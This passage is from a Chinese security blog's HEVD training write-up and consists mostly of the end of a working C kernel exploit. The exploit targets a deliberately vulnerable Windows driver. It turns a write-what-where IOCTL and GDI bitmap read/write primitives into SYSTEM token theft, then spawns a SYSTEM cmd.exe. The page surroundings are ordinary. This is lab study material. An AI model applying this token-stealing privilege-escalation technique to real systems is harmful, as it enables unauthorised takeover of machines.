&amp;lpcbNeeded);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//Retrieves the base name of the specified device driver</span></span><br><span class="line">		GetDeviceDriverBaseNameA(lpImageBase[i], (<span class="keyword">char</span>*)driverName, <span class="number">48</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)driverName, <span class="string">"nt"</span>, <span class="number">2</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"[+]success to get %s\n"</span>, driverName);</span><br><span class="line">			<span class="keyword">return</span> (DWORD32)lpImageBase[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD32 <span class="title">getSystemEProcessAddr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	DWORD32 ntKernelBase = getKernelBase();</span><br><span class="line">	<span class="keyword">if</span> (ntKernelBase) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Success get ntKernelBase: 0x%p\n"</span>, ntKernelBase);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Failed get ntKernelBase\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD32 ntUserBase = <span class="literal">NULL</span>;</span><br><span class="line">	ntUserBase = (DWORD32)LoadLibraryA(driverName);</span><br><span class="line">	<span class="keyword">if</span> (ntUserBase) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Success get ntUserBase: 0x%p\n"</span>, ntUserBase);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Failed get ntUserBase\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD32 PsInitialSystemProcessUserSpaceAddr = (DWORD32)GetProcAddress((HMODULE)ntUserBase, <span class="string">"PsInitialSystemProcess"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!PsInitialSystemProcessUserSpaceAddr) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Failed get PsInitialSystemProcessUserSpaceAddr\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Success get PsInitialSystemProcessUserSpaceAddr: 0x%p\n"</span>, PsInitialSystemProcessUserSpaceAddr);</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD32 PsInitialSystemProcessKernelSpaceAddr = ntKernelBase + (PsInitialSystemProcessUserSpaceAddr - ntUserBase);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"PsInitialSystemProcessKernelSpaceAddr:0x%p"</span>, PsInitialSystemProcessKernelSpaceAddr);</span><br><span class="line">	<span class="keyword">return</span> PsInitialSystemProcessKernelSpaceAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD32 <span class="title">getpvScan0Address</span><span class="params">(HBITMAP handle)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"    handle value: 0x%p\n"</span>, (DWORD32)handle);</span><br><span class="line"></span><br><span class="line">	DWORD32 tebAddr = (DWORD32)NtCurrentTeb();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"    tebAddr: 0x%p\n"</span>, tebAddr);</span><br><span class="line"></span><br><span class="line">	DWORD32 pebAddr = *(PDWORD32)((PUCHAR)tebAddr + <span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"    pebAddr: 0x%p\n"</span>, pebAddr);</span><br><span class="line"></span><br><span class="line">	DWORD32 GdiSharedHandleTableAddr = *(PDWORD32)((PUCHAR)pebAddr + <span class="number">0x94</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"    GdiSharedHandleTableAddr: 0x%p\n"</span>, GdiSharedHandleTableAddr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// GdiSharedHandleTableAddr 是一个指向GDICELL结构体数组的指针</span></span><br><span class="line">	<span class="comment">// GDICELL 结构体 x86 0x10,x64 0x18</span></span><br><span class="line">	DWORD32 pKernelAddress = GdiSharedHandleTableAddr + ((DWORD32)handle &amp; <span class="number">0xffff</span>) * <span class="number">0x10</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"    pKernelAddress: 0x%p\n"</span>, pKernelAddress);</span><br><span class="line"></span><br><span class="line">	DWORD32 surfaceObject = *(PDWORD32)pKernelAddress;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"    surfaceObject address: 0x%p\n"</span>, surfaceObject);</span><br><span class="line">	<span class="comment">// BASEOBJECT 结构体 x86 0x10,x64 0x18</span></span><br><span class="line">	<span class="comment">// pvScan0 在 SURFOBJ 结构体中的偏移 x86 0x20,x64 0x38</span></span><br><span class="line">	DWORD32 pvScan0Address = surfaceObject + <span class="number">0x10</span> + <span class="number">0x20</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"    pvScan0 address: 0x%p\n"</span>, pvScan0Address);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> pvScan0Address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Trigger</span><span class="params">(DWORD32 where, DWORD32 what, HANDLE hevd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WRITE_WHAT_WHERE exploit;</span><br><span class="line">	DWORD lpbReturn = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	exploit.Where = (PULONG_PTR)where;</span><br><span class="line">	exploit.What = (PULONG_PTR)&amp; what;</span><br><span class="line"></span><br><span class="line">	DeviceIoControl(hevd,</span><br><span class="line">		<span class="number">0x22200B</span>,</span><br><span class="line">		&amp;exploit,</span><br><span class="line">		<span class="keyword">sizeof</span>(WRITE_WHAT_WHERE),</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;lpbReturn,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">OpenDriver</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE hevd = CreateFileA(<span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hevd == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		wprintf(<span class="string">L"[-] Failed to open hevd\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		wprintf(<span class="string">L"[+] Success to open hevd\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> hevd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE hevd = OpenDriver();</span><br><span class="line">	HBITMAP hManager = CreateBitmap(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hManager == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"create manager bitmap failed\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	HBITMAP hWorker = CreateBitmap(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hWorker == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"create worker bitmap failed\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Manager bitmap:\n"</span>);</span><br><span class="line">	DWORD32 ManagerpvScan0Address = getpvScan0Address(hManager);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Worker bitmap:\n"</span>);</span><br><span class="line">	DWORD32 WorkerpvScan0Address = getpvScan0Address(hWorker);</span><br><span class="line">	Trigger(ManagerpvScan0Address, WorkerpvScan0Address, hevd);</span><br><span class="line"></span><br><span class="line">	DWORD32 systemEprocessAddr = <span class="number">0</span>;</span><br><span class="line">	systemEprocessAddr = getSystemEProcessAddr();</span><br><span class="line">	LPVOID lpSystemToken = <span class="literal">NULL</span>; <span class="comment">// 获取 system 进程的 token</span></span><br><span class="line">	readOOB(hManager, hWorker, getSystemEProcessAddr(), &amp;systemEprocessAddr, <span class="keyword">sizeof</span>(DWORD32));</span><br><span class="line">	readOOB(hManager, hWorker, (systemEprocessAddr + <span class="number">0x0f4</span>), &amp;lpSystemToken, <span class="keyword">sizeof</span>(DWORD32));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// _eprocess + 0x0f4 是 token</span></span><br><span class="line">	<span class="comment">// _eprocess + 0x0B8 是 ActiveProcessLinks.Flink</span></span><br><span class="line">	<span class="comment">// _eprocess + 0x0b4 是 processid</span></span><br><span class="line">	<span class="comment">// 获取当前进程的 _eprocess</span></span><br><span class="line">	DWORD32 lpNextEPROCESS = <span class="number">0</span>;</span><br><span class="line">	LPVOID lpCurrentPID = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD32 dwCurrentPID;</span><br><span class="line">	LIST_ENTRY lpNextEntryAddreess = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	DWORD32 currentProcessID = GetCurrentProcessId();   <span class="comment">// 通过PID判断是否获取到当前进程的地址</span></span><br><span class="line">	readOOB(hManager, hWorker, systemEprocessAddr + <span class="number">0x0B8</span>, &amp;lpNextEntryAddreess, <span class="keyword">sizeof</span>(LIST_ENTRY));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span>  <span class="comment">// 根据PID是否找到当前进程 </span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 获取下一个进程</span></span><br><span class="line">		lpNextEPROCESS = (DWORD32)((PUCHAR)lpNextEntryAddreess.Flink - <span class="number">0x0B8</span>);</span><br><span class="line">		<span class="comment">// 获取PID</span></span><br><span class="line">		readOOB(hManager, hWorker, lpNextEPROCESS + <span class="number">0x0b4</span>, &amp;lpCurrentPID, <span class="keyword">sizeof</span>(LPVOID));</span><br><span class="line">		dwCurrentPID = LOWORD(lpCurrentPID);</span><br><span class="line">		readOOB(hManager, hWorker, lpNextEPROCESS + <span class="number">0x0B8</span>, &amp;lpNextEntryAddreess, <span class="keyword">sizeof</span>(LIST_ENTRY));</span><br><span class="line">	&#125; <span class="keyword">while</span> (dwCurrentPID != currentProcessID);</span><br><span class="line"></span><br><span class="line">	DWORD32 currentTokenAddress = (DWORD32)lpNextEPROCESS + <span class="number">0x0f4</span>;</span><br><span class="line">	writeOOB(hManager, hWorker, currentTokenAddress, lpSystemToken, <span class="keyword">sizeof</span>(LPVOID));</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h2><ul><li><a href="https://50u1w4y.github.io/site/HEVD/bitmap">bitmap 任意地址写漏洞利用</a></li><li><a href="https://paper.seebug.org/876/">Windows Kernel Exploit Part 5</a></li></ul></div><div class="article-tags size-small mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/research/">research</a><a class="link-muted mr-2" rel="tag" href="/tags/HEVD/">HEVD</a></div><div class="a2a_kit a2a_kit_size_32 a2a_default_style"><a class="a2a_dd" href="https://www.addtoany.com/share"></a><a class="a2a_button_facebook"></a><a class="a2a_button_twitter"></a><a class="a2a_button_telegram"></a><a class="a2a_button_whatsapp"></a><a class="a2a_button_reddit"></a></div><script src="https://static.addtoany.com/menu/page.js" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button is-info donate"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/images/alipay.jpeg" alt="支付宝"></span></a><a class="button is-success donate"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/images/wechatpay.jpeg" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/65b262b3.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">VMware Fusion 清理虚拟机磁盘</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/bbe71603.html"><span class="level-item">HEVD ArbitraryOverwrite [win7sp1]</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script>new Valine({el:"#valine-thread",appId:"arzLjs0uhdNidwVh9BC6XEl2-gzGzoHsz",appKey:"UTxl8VuzUJM8vVhRdRKuNIM6",placeholder:"ヾﾉ≧∀≦)o 来呀！快活呀！~",avatar:"mm",meta:["nick","mail","link"],pageSize:10,lang:"zh-CN",highlight:!0,requiredFields:[]})</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen order-1 is-sticky"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://www.gravatar.com/avatar/9b722a00f4fc188a2dbfa47ac65b8773?s=128" alt="食兔人"></figure><p class="title is-size-4 is-block line-height-inherit">食兔人</p><p class="is-size-6 is-block">学生,信息安全爱好者</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>北京,中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">103</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">35</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">35</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ycdxsb" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ycdxsb"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/ycdxsb"><i class="fab fa-twitter"></i></a></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile is-mobile" href="http://m0te.top/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Mote</span></span><span class="level-right"><span class="level-item tag">m0te.top</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://yurisec.cn/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Yuri</span></span><span class="level-right"><span class="level-item tag">yurisec.cn</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://blog.6237.cf" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Mad</span></span><span class="level-right"><span class="level-item tag">blog.6237.cf</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/07/"><span class="level-start"><span class="level-item">七月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/06/"><span class="level-start"><span class="level-item">六月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/10/"><span class="level-start"><span class="level-item">十月 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/09/"><span class="level-start"><span class="level-item">九月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/08/"><span class="level-start"><span class="level-item">八月 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/07/"><span class="level-start"><span class="level-item">七月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/06/"><span class="level-start"><span class="level-item">六月 2020</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/05/"><span class="level-start"><span class="level-item">五月 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">四月 2020</span></span><span class="level-end"><span class="level-item tag">28</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=ycdxsb/fVNc&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="ycdxsb/fVNc" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button is-primary" type="submit" value="订阅"></div></div><p class="help">邮件订阅，更新早知道</p></form></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/AI/"><span class="level-start"><span class="level-item">AI</span></span><span class="level-end"><span class="level-item tag">2</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/AI/NLP/"><span class="level-start"><span class="level-item">NLP</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/AI/machine-learning/"><span class="level-start"><span class="level-item">machine_learning</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">47</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/CVE/"><span class="level-start"><span class="level-item">CVE</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/crypto/"><span class="level-start"><span class="level-item">crypto</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/pentest/"><span class="level-start"><span class="level-item">pentest</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">24</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/pwnable-kr/"><span class="level-start"><span class="level-item">pwnable.kr</span></span><span class="level-end"><span class="level-item tag">21</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/pwnable-kr/Toddler-sBottle/"><span class="level-start"><span class="level-item">Toddler&#039;sBottle</span></span><span class="level-end"><span class="level-item tag">21</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/stack-overflow/"><span class="level-start"><span class="level-item">stack_overflow</span></span><span class="level-end"><span class="level-item tag">3</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF/pwn/stack-overflow/ROP-Emporium/"><span class="level-start"><span class="level-item">ROP_Emporium</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/re/"><span class="level-start"><span class="level-item">re</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/writeup/"><span class="level-start"><span class="level-item">writeup</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/PyQt5/"><span class="level-start"><span class="level-item">PyQt5</span></span><span class="level-end"><span class="level-item tag">12</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/PyQt5/Web/"><span class="level-start"><span class="level-item">Web</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/PyQt5/%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"><span class="level-start"><span class="level-item">图书馆管理系统</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/life/"><span class="level-start"><span class="level-item">life</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/"><span class="level-start"><span class="level-item">papers</span></span><span class="level-end"><span class="level-item tag">17</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/papers/security/"><span class="level-start"><span class="level-item">security</span></span><span class="level-end"><span class="level-item tag">17</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/papers/security/automatic-analyse/"><span class="level-start"><span class="level-item">automatic_analyse</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/binary-analyse/"><span class="level-start"><span class="level-item">binary_analyse</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/fuzz/"><span class="level-start"><span class="level-item">fuzz</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/mobile-security/"><span class="level-start"><span class="level-item">mobile_security</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/others/"><span class="level-start"><span class="level-item">others</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/papers/security/security-situation-awareness/"><span class="level-start"><span class="level-item">security_situation_awareness</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/research/"><span class="level-start"><span class="level-item">research</span></span><span class="level-end"><span class="level-item tag">20</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/research/Fuzz/"><span class="level-start"><span class="level-item">Fuzz</span></span><span class="level-end"><span class="level-item tag">1</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/research/Fuzz/FuzzingBook/"><span class="level-start"><span class="level-item">FuzzingBook</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/research/HEVD/"><span class="level-start"><span class="level-item">HEVD</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/research/codeql/"><span class="level-start"><span class="level-item">codeql</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/research/linux-kernel/"><span class="level-start"><span class="level-item">linux_kernel</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/research/windows/"><span class="level-start"><span class="level-item">windows</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/tools/"><span class="level-start"><span class="level-item">tools</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/work/"><span class="level-start"><span class="level-item">work</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content size-small"><p><time datetime="2021-09-18T02:43:00.000Z">2021-09-18</time></p><p class="title is-6"><a class="link-muted" href="/a0dc8841.html">2021 5space 第五空间线上部分writeup</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/writeup/">writeup</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2021-08-19T07:04:00.000Z">2021-08-19</time></p><p class="title is-6"><a class="link-muted" href="/6f260b49.html">FuzzingBook学习 Part2-1</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/research/">research</a> / <a class="link-muted" href="/categories/research/Fuzz/">Fuzz</a> / <a class="link-muted" href="/categories/research/Fuzz/FuzzingBook/">FuzzingBook</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2021-07-27T14:14:00.000Z">2021-07-27</time></p><p class="title is-6"><a class="link-muted" href="/6c5275ae.html">CVE-2020-0796(SMBGhost) RCE 复现</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/pentest/">pentest</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2021-07-06T02:43:00.000Z">2021-07-06</time></p><p class="title is-6"><a class="link-muted" href="/c165a3fd.html">0CTF 2021 划水小记</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/CTF/">CTF</a> / <a class="link-muted" href="/categories/CTF/writeup/">writeup</a></p></div></article><article class="media"><div class="media-content size-small"><p><time datetime="2021-07-05T07:19:00.000Z">2021-07-05</time></p><p class="title is-6"><a class="link-muted" href="/bbd76e46.html">C/C++文件解析</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/tools/">tools</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/AI/"><span class="tag">AI</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">47</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVE/"><span class="tag">CVE</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Fuzz/"><span class="tag">Fuzz</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/FuzzingBook/"><span class="tag">FuzzingBook</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags 